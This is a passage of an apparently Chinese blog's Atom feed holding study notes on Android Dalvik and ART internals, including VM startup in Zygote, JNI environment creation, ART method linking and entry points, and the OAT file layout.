align="left">类型为ClassLoader，描述所使用的类加载器</td></tr></tbody></table><ol><li><p>将参数class_loader描述的ClassLoader设置到klass描述的Class对象中去，即给每一个已加载类关联一个类加载器。</p></li><li><p>通过DexFile类的成员函数GetIndexForClassDef获得正在加载的类在DEX文件中的类索引号，并且设置到klass描述的Class对象中去。这个类索引号是一个很重要的信息，因为我们需要通过类索引号在相应的OAT文件找到一个OatClass结构体。有了这个OatClass结构体之后，我们才可以找到类方法对应的本地机器指令。</p></li><li><p>从参数dex_file描述的DEX文件中获得正在加载的类的静态成员变量和实例成员变量个数，并且为每一个静态成员变量和实例成员变量都分配一个ArtField对象，接着通过ClassLinker类的成员函数LoadField对这些ArtField对象进行初始化。初始好得到的ArtField对象全部保存在klass描述的Class对象中。</p></li><li><p>调用ClassLinker类的成员函数GetOatClass，从相应的OAT文件中找到与正在加载的类对应的一个OatClass结构体oat_class。这需要利用到上面提到的DEX类索引号，这是因为DEX类和OAT类根据索引号存在一一对应关系。</p></li><li><p> 从参数dex_file描述的DEX文件中获得正在加载的类的直接成员函数和虚拟成员函数个数，并且为每一个直接成员函数和虚拟成员函数都分配一个ArtMethod对象，接着通过ClassLinker类的成员函数LoadMethod对这些ArtMethod对象进行初始化。初始好得到的ArtMethod对象全部保存在klass描述的Class对象中。</p></li><li><p> 每一个直接成员函数和虚拟成员函数都对应有一个函数索引号。根据这个函数索引号可以在第4步得到的OatClass结构体中找到对应的本地机器指令。所有与这些成员函数关联的本地机器指令信息通过全局函数LinkCode设置到klass描述的Class对象中。</p></li></ol><h3 id="LinkCode"><a href="#LinkCode" class="headerlink" title="LinkCode:"></a><strong>LinkCode:</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static void LinkCode(SirtRef&lt;mirror::ArtMethod&gt;&amp; method, const OatFile::OatClass* oat_class,  </span><br><span class="line">                     uint32_t method_index)  </span><br><span class="line">    SHARED_LOCKS_REQUIRED(Locks::mutator_lock_) &#123;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">method</td><td align="left">要设置本地机器指令的类方法</td></tr><tr><td align="left">oat_class</td><td align="left">类方法method在OAT文件中对应的OatClass结构体</td></tr><tr><td align="left">method_index</td><td align="left">类方法method的索引号</td></tr></tbody></table><p>在OatClass中，用method就能索引到method的本地指令地址，调用LinkMethod就能将method解析为ArtMethod。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void OatFile::OatMethod::LinkMethod(mirror::ArtMethod* method) const &#123;  </span><br><span class="line">  CHECK(method != NULL);  </span><br><span class="line">  method-&gt;SetEntryPointFromCompiledCode(GetCode());  </span><br><span class="line">  method-&gt;SetFrameSizeInBytes(frame_size_in_bytes_);  </span><br><span class="line">  method-&gt;SetCoreSpillMask(core_spill_mask_);  </span><br><span class="line">  method-&gt;SetFpSpillMask(fp_spill_mask_);  </span><br><span class="line">  method-&gt;SetMappingTable(GetMappingTable());  </span><br><span class="line">  method-&gt;SetVmapTable(GetVmapTable());  </span><br><span class="line">  method-&gt;SetNativeGcMap(GetNativeGcMap());  // Used by native methods in work around JNI mode.  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来通过OatMethod::GetCode获得OatMethod结构体中的code_offset_字段（指向的是一个本地机器指令函数，这个本地机器指令函数正是通过翻译该方法的DEX字节码得到的），并且通过调用ArtMethod类的成员函数SetEntryPointFromCompiledCode设置到参数method描述的ArtMethod对象中去。</p><p>类方法可以通过本地指令执行，也可以通过解释器执行<br>NeedsInterpreter检查该类方法是否需要解释器<br>enter_interpreter?true or false</p><p><strong>设置入口点：</strong></p><p>需要解释器的非native方法：artInterpreterToInterpreterBridge设置为解释器执行该类方法的入口点<br>不需要解释器的方法或native方法：artInterpreterToCompiledCodeBridge设置为解释器执行该类方法的入口点（伪入口，间接调用本地指令）<br>抽象方法 ： GetCompiledCodeToInterpreterBridge-&gt;Interpreter</p><p><strong>调整入口点：</strong></p><p>静态类构造方法：Trampoline-&gt;wait class initializing-&gt;native code </p><blockquote><p>ClassLinker::FixupStaticTrampolines install the Trampoline</p></blockquote><p>需要通过解释器执行的方法：</p><ol><li>没有对应的本地机器指令，即参数code的值等于NULL。</li><li>ART虚拟机运行在解释模式中，并且类方法不是JNI方法，并且也不是代理方法</li></ol><p>解释器入口都设置为：GetCompiledCodeToInterpreterBridge（to get a unified enterpoint）</p><p>注册native方法</p><blockquote><p>ArtMethod类的成员函数UnregisterNative实际上就是将一个JNI方法的初始化入口设置为通过调用函数GetJniDlsymLookupStub获得的一个Stub。这个Stub的作用是，当一个JNI方法被调用时，如果还没有显示地注册有Native函数，那么它就会自动从已加载的SO文件查找是否存在一个对应的Native函数。如果存在的话，就将它注册为JNI方法的Native函数，并且执行它。这就是隐式的JNI方法注册。</p></blockquote><p>UpdateMethodsCode更新方法入口，是否设置监控函数</p><h3 id="GetStaticMethodID："><a href="#GetStaticMethodID：" class="headerlink" title="GetStaticMethodID："></a><strong>GetStaticMethodID：</strong></h3><blockquote><ol><li>将参数jni_class的值转换为一个Class指针c，因此就可以得到一个Class对象，并且通过ClassLinker类的成员函数EnsureInitialized确保该Class对象描述的类已经初始化。</li></ol></blockquote><blockquote><ol start="2"><li>Class对象c描述的类在加载的过程中，经过解析已经关联上一系列的成员函数。这些成员函数可以分为两类：Direct和Virtual。Direct类的成员函数包括所有的静态成员函数、私有成员函数和构造函数，而Virtual则包括所有的虚成员函数。因此：</li><li><ol><li>当参数is_static的值等于true时，那么就表示要查找的是静态成员函数，这时候就在Class对象c描述的类的关联的Direct成员函数列表中查找参数name和sig对应的成员函数。这是通过调用Class类的成员函数FindDirectMethod来实现的。</li></ol></li><li><ol start="2"><li>当参数is_static的值不等于true时，那么就表示要查找的是虚拟成员函数或者非静态的Direct成员函数，这时候先在Class对象c描述的类的关联的Virtual成员函数列表中查找参数name和sig对应的成员函数。这是通过调用Class类的成员函数FindVirtualMethod来实现的。如果找不到对应的虚拟成员函数，那么再在Class对象c描述的类的关联的Direct成员函数列表中查找参数name和sig对应的成员函数。</li></ol></li></ol></blockquote><blockquote><ol start="3"><li>经过前面的查找过程，如果都不能在Class对象c描述的类中找到与参数name和sig对应的成员函数，那么就抛出一个NoSuchMethodError异常。否则的话，就将查找得到的ArtMethod对象封装成一个jmethodID值返回给调用者。</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>android虚拟机（一）</title>
    <link href="https://f4ncy.top/2018/03/29/androidVM1/"/>
    <id>https://f4ncy.top/2018/03/29/androidVM1/</id>
    <published>2018-03-28T16:38:45.000Z</published>
    <updated>2019-02-25T05:08:10.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="android虚拟机（一）"><a href="#android虚拟机（一）" class="headerlink" title="android虚拟机（一）"></a>android虚拟机（一）</h1><h2 id="Dalvik虚拟机"><a href="#Dalvik虚拟机" class="headerlink" title="Dalvik虚拟机"></a>Dalvik虚拟机</h2><h3 id="Dalvik虚拟机的启动过程"><a href="#Dalvik虚拟机的启动过程" class="headerlink" title="Dalvik虚拟机的启动过程"></a>Dalvik虚拟机的启动过程</h3><p><a href="https://blog.csdn.net/luoshengyang/article/details/8885792">https://blog.csdn.net/luoshengyang/article/details/8885792</a></p><p>Zygote进程在启动时会创建一个Dalvik实例，在它孵化app的进程时会复制一份到app的进程中，使每一个app进程都有一个独立的Dalvik虚拟机实例。</p><p><img src="http://img.blog.csdn.net/20130506004759886"></p><p>Dalvik虚拟机在Zygote进程中的启动过程，这个启动过程主要完成以下4个事情：</p><ol><li>创建了一个Dalvik虚拟机实例；（这里只是对JavaVM结构的成员变量赋值，真正环境的创建在step.3）</li><li>为主线程的设置了一个JNI环境；</li><li>加载了Java核心类及其JNI方法；</li><li>注册了Android核心类的JNI方法。</li></ol><p>AndroidRuntime类的start主要做了一下四件事：</p><ol><li>调用startVm来创建一个Dalvik虚拟机实例，保存在成员变量mJavaVM。（JavaVM是Dalvik虚拟机在JNI中的表示）</li><li>调用成员函数startReg来注册一些Android核心类的JNI方法。</li><li>通过JNI接口，FindClass找到com.android.internal.os.ZygoteInit类，通过JNI接口，GetStaticMethodID找到com.android.internal.os.ZygoteInit类的静态成员函数main作为java层的入口。</li><li>在Zygote进程退出时，会调用JavaVM的成员函数DetachCurrentThread来使Dalvik虚拟机实例和Zygote进程的主线程脱离，再调用DestroyJavaVM来销毁Dalvik虚拟机实例。</li></ol><p>关于JavaVM与JVM的区别：在java里，每一个process可以产生多个java vm对象，但是在android上，每一个process只有一个Dalvik虚拟机对象，也就是在android进程中是通过有且只有一个虚拟器对象来服务所有java和c/c++代码。</p><p>startVM调用JNI_CreateJavaVM来创建</p><p>JNI_CreateJavaVM主要完成以下四件事情。</p><ol><li>为当前进程创建一个Dalvik虚拟机实例，即一个JavaVMExt对象。</li><li>为当前线程创建和初始化一个JNI环境，即一个JNIEnvExt对象，这是通过调用函数dvmCreateJNIEnv来完成的。</li><li>将参数vm_args所描述的Dalvik虚拟机启动选项拷贝到变量argv所描述的一个字符串数组中去，并且调用函数dvmStartup来初始化前面所创建的Dalvik虚拟机实例。</li><li>调用函数dvmChangeStatus将当前线程的状态设置为正在执行NATIVE代码，并且将面所创建和初始化好的JavaVMExt对象和JNIEnvExt对象通过输出参数p_vm和p_env返回给调用者。</li></ol><p>在Java层调用C层的本地函数时，调用c本地函数的线程必然通过Dalvik虚拟机来调用c层的本地函数，此时，Dalvik虚拟机会为本地的C组件实例化一个JNIEnv指针，该指针指向Dalvik虚拟机的具体的函数列表。<br>当JNI的c组件调用Java层的方法或者属性时，需要通过JNIEnv指针来进行调用。<br>当本地c/c++想获得当前线程所要使用的JNIEnv时，可以使用Dalvik虚拟机对象的JavaVM* jvm-&gt;GetEnv()返回当前线程所在的JNIEnv*<br>（可以联系在native中，动态注册函数的流程）</p><p>JavaVMExt对象和JNIEnv对象都有一个函数列表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct JavaVMExt &#123;</span><br><span class="line">    <span class="keyword">const</span> struct JNIInvokeInterface* funcTable;     <span class="comment">/* must be first */</span></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">struct JNIEnvExt &#123;</span><br><span class="line">    <span class="keyword">const</span> struct JNINativeInterface* funcTable;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>调用dvmCreateJNIEnv来创建JNIEnv</p><ol><li>创建一个JNIEnvExt对象，用来描述一个JNI环境，并且设置这个JNIEnvExt对象的宿主Dalvik虚拟机，以及所使用的本地接口表，即设置这个JNIEnvExt对象的成员变量funcTable和vm。这里的宿主Dalvik虚拟机即为当前进程的Dalvik虚拟机，它保存在全局变量gDvm的成员变量vmList中。本地接口表由全局变量gNativeInterface来描述。</li><li>参数self描述的是前面创建的JNIEnvExt对象要关联的线程，可以通过调用函数dvmSetJniEnvThreadId来将它们关联起来。注意，当参数self的值等于NULL的时候，就表示前面的JNIEnvExt对象是要与主线程关联的，但是要等到后面再关联，因为现在用来描述主线程的Thread对象还没有准备好。通过将一个JNIEnvExt对象的成员变量envThreadId和self的值分别设置为0x77777775和0x77777779来表示它还没有与线程关联。</li><li>在一个Dalvik虚拟机里面，可以运行多个线程。所有关联有JNI环境的线程都有一个对应的JNIEnvExt对象，这些JNIEnvExt对象相互连接在一起保存在用来描述其宿主Dalvik虚拟机的一个JavaVMExt对象的成员变量envList中。因此，前面创建的JNIEnvExt对象需要连接到其宿主Dalvik虚拟机的JavaVMExt链表中去。</li></ol><p>创建JavaVM和JNIEnv过程大致相同，绑定一个函数列表，然后将该对象的指针保存起来。</p><p>调用dvmStartup初始化JavaVM</p><p>子模块的初始化</p><p>最后一步的初始化：dvmDebuggerStartup-&gt;dvmInitZygote</p><p>调用了系统调用setpgid来设置当前进程，即Zygote进程的进程组ID，两个参数均为0，这意味着Zygote进程的进程组ID与进程ID是相同的，也就是说，Zygote进程运行在一个单独的进程组里面。</p><h3 id="Dalvik虚拟机的运行过程"><a href="#Dalvik虚拟机的运行过程" class="headerlink" title="Dalvik虚拟机的运行过程"></a>Dalvik虚拟机的运行过程</h3><p><a href="http://blog.csdn.net/luoshengyang/article/details/8914953">http://blog.csdn.net/luoshengyang/article/details/8914953</a></p><p><img src="http://img.blog.csdn.net/20130512232649003"></p><p>JNIEnv的CallStaticVoidMethod调用回调函数表中的CallStaticVoidMethodV，来执行参数clazz和methodID所描述的Java代码。</p><p>CallStaticVoidMethodV-&gt;CallStatic##_jname##MethodV-&gt;dvmCallMethodV</p><p>函数dvmCallMethodV首先检查参数method描述的函数是否是一个JNI方法。如果是的话，那么它所指向的一个Method对象的成员变量nativeFunc就指向该JNI方法的地址，因此就可以直接对它进行调用。否则的话，就说明参数method描述的是一个Java函数，这时候就需要继续调用函数dvmInterpret来执行它的代码.</p><p>dvmCallMethodV中会根据执行模式来选择不同的解释器入口。</p><p>进入解释器后，对需要执行的java的类所相关部分进行初始化，之后是循环读取、解释指令码，直到return为止。</p><p>其中讲到Dalvik虚拟机解释器的可移植版本实现中，解释器对指令流的解释时，在获取到return指令时截止，是否可以在return指令后添加junk code。</p><h2 id="ART虚拟机"><a href="#ART虚拟机" class="headerlink" title="ART虚拟机"></a>ART虚拟机</h2><p><a href="https://blog.csdn.net/luoshengyang/article/details/39256813">https://blog.csdn.net/luoshengyang/article/details/39256813</a></p><p>ART虚拟机实例的创建和Dalvik大相径庭。<br>ART虚拟机在Zygote进程中创建并启动，再由Zygote来fork给应用程序进程</p><p>###ART加载OAT文件的过程</p><p><a href="https://blog.csdn.net/luoshengyang/article/details/39307813">https://blog.csdn.net/luoshengyang/article/details/39307813</a></p><p>讲解一下OAT文件的格式，以及加载OAT的过程，包括涉及到的函数</p><p>oat文件本质上就是一个ELF文件</p><p>启动<br>Runtime create<br>Runtime init<br>&emsp;&emsp;Android 5.0中将option的解析放在了init中<br>&emsp;&emsp;&emsp;&emsp;1⃣️ ART启动<br>&emsp;&emsp;&emsp;&emsp;2⃣️ interpret DEX<br>&emsp;&emsp;ParsedOptions::Create<br>&emsp;&emsp;&emsp;&emsp;解析启动参数<br>&emsp;&emsp;Heap<br>&emsp;&emsp;&emsp;&emsp;space::ImageSpace::Create<br>&emsp;&emsp;JavaVMExt<br>&emsp;&emsp;Thread::Attach<br>&emsp;&emsp;GetHeap</p><p>运行<br>OatFile::Open<br>&emsp;&emsp;1⃣️portable&amp;&amp;executable：OpenDlopen<br>&emsp;&emsp;new OatFile<br>&emsp;&emsp;Dlopen<br>&emsp;&emsp;&emsp;&emsp;dlopne、dlsym -&gt; get begin/end (得到内存中oatdata段的内存区域)<br>&emsp;&emsp;2⃣️OpenElfFile<br>&emsp;&emsp;ElfFileOpen<br>&emsp;&emsp;&emsp;&emsp;FindDynamicSymbolAddress-&gt;get begin/end (得到内存中oatdata段的内存区域)<br>&emsp;&emsp;&emsp;&emsp;Setup<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;GetOatHeader<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;GetOatHeader().GetKeyValueStoreSize()<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;GetOatHeader().GetDexFileCount()</p><p><img src="/2018/03/29/androidVM1/15226886044319.jpg" alt="oatdata-c500"></p><p>获取到Dex文件的过程：先获取到OAT文件中的oatdata段起始地址，找到oatheader，跃过header，找到oat_dex_file，由偏移dex_file_offset（与oatdata起始的偏移）定位到dexfile。</p><p>获取方法的过程：同样以上方式找到oat_dex_file，在dex_file_offset后是一个数组，元素是指向oat_class的指针，每个oat_class与dex中的class一一对应。<br>oat_class:</p><table><thead><tr><th>Size</th><th>Name</th></tr></thead><tbody><tr><td>Int16</td><td>status</td></tr><tr><td>Int16</td><td>Type</td></tr><tr><td>Int32</td><td>Bitsize(when type==1)</td></tr><tr><td>Byte * bitsize</td><td>Bitmap[bitsize]（when type==1）</td></tr><tr><td>Int32 * 2 * n</td><td>OatMethodOffset[n]</td></tr></tbody></table><p>OatMethodOffset:</p><table><thead><tr><th>size</th><th>name</th></tr></thead><tbody><tr><td>int32</td><td>code_offest</td></tr><tr><td>int</td><td>gc_map_offset</td></tr></tbody></table><p>根据需要的method所在类的编号（在dex中class_def_item数组的索引值），找到对应oat_class，再根据method的编号（class_def_item中方法对应的encode_method数组的索引值），找到对应的OatMethodOffset，由begin_+code_offset(begin为内存中oatdata起始地址)，得到method的本地指令地址。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
</feed>
